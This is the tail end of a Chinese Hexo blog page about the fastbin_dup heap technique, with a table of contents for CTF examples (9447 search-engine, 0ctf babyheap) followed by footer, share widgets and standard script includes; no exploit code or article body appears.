                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#fastbin-dup原理"><span class="post-toc-number">1.</span> <span class="post-toc-text">fastbin_dup原理</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#例题-9447-search-engine"><span class="post-toc-number">2.</span> <span class="post-toc-text">例题-9447-search-engine</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#条件"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">条件</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用思路"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">利用思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#例题-0ctfbabyheap"><span class="post-toc-number">3.</span> <span class="post-toc-text">例题-0ctfbabyheap</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#条件-1"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">条件</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析-1"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-1"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        我们一起来让这个世界有趣一点
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    
</div>

        <footer class="footer">
    
    <div class="top">
        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Sirius Whiter &copy; 2018 - 2019
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/10/15/introduction-to-pwn2-1-fastbin-dup/&title=《Introduction to pwn2.1-fastbin_dup》 — Room of Equirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/10/15/introduction-to-pwn2-1-fastbin-dup/&title=《Introduction to pwn2.1-fastbin_dup》 — Room of Equirement&source=pwn菜鸡一枚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACq0lEQVR42u3a0U7DMAwF0P7/T4PEK2p3bccbSKdP0yhtTpASc53riq+vn+v58+/7qz9NfuvauPDw8PBaQ7+77l58d2dy//N7n8eWjxkPDw9vm5dsBtXX9Jby/L3R5oGHh4f3Ud7d/dUSuYfHw8PD+++858ElU5M/AQ8PD+9v8pIwInl9L2JIAt/1rAUPDw/vZD5QXui3P3+gv4eHh4cXh7C9xb3a/u9tEi9Gi4eHh7fAO9VkqsYW1eI42RIK/zHg4eHhHeX1woK86ZW8N99CoggYDw8P7yiv+ojqQt8b1jwyxsPDw9vmPQ+u12rKkfk91aAEDw8Pb5uXL8e9I1BJYNGLRW4nGg8PD2+BlyOrg4tSkMEhhqTIxsPDw9vg9UrkvDWVT02yqZRLeTw8PLxlXvVAVW9YefyRTOuLp+Hh4eEt8PJYYVKz99pp1UIfDw8P7z28pFAuNJzigDWPd0eRBx4eHt5beAkgjwny6Zg33qIYFw8PD+8oLznwlAwo2QySkn3eJMPDw8Pb5lXjg2pbK2+hJaVzOaXGw8PDO8TLW1C98jcvu/MnJ80wPDw8vG1eHgH0Cu5qsV4NhaM78fDw8NZ4veNNvQCiejyrHEbg4eHhLfCqpXO+PcwnJY8trnz+8PDw8Ma8armcBxZ52Z0XytU/Ax4eHt4G79TC3cNMpi96Jh4eHt4y71QcMAk1qgU6Hh4e3vt5vcg1X7ir9xQihgPBNR4eHl6fNNkeenf2YOV4Fw8PD2+BN9k2TpXL86gij1Hw8PDwTvGSzWB+dKC6rB875oWHh4e3xsujhLxozr+vMgqRBx4eHt5HefOhT57WGyEeHh7e3+T1QopqCNKcbjw8PLw1XjWMSBb0yfpcDXBvv8HDw8Nb4M0bYPlBgWTovevA8Sw8PDy817xvwCtK3zk98sUAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
<script type="text/javascript" color="255,0,0"opacity="0.3"count="70" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>

<!-- third-party -->
<script type="text/javascript">
;( function( $ ) {

	$( '.swipebox' ).swipebox({
		hideCloseButtonOnMobile: true
	});

} )( jQuery );
</script>






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>






    
</body>
</html>
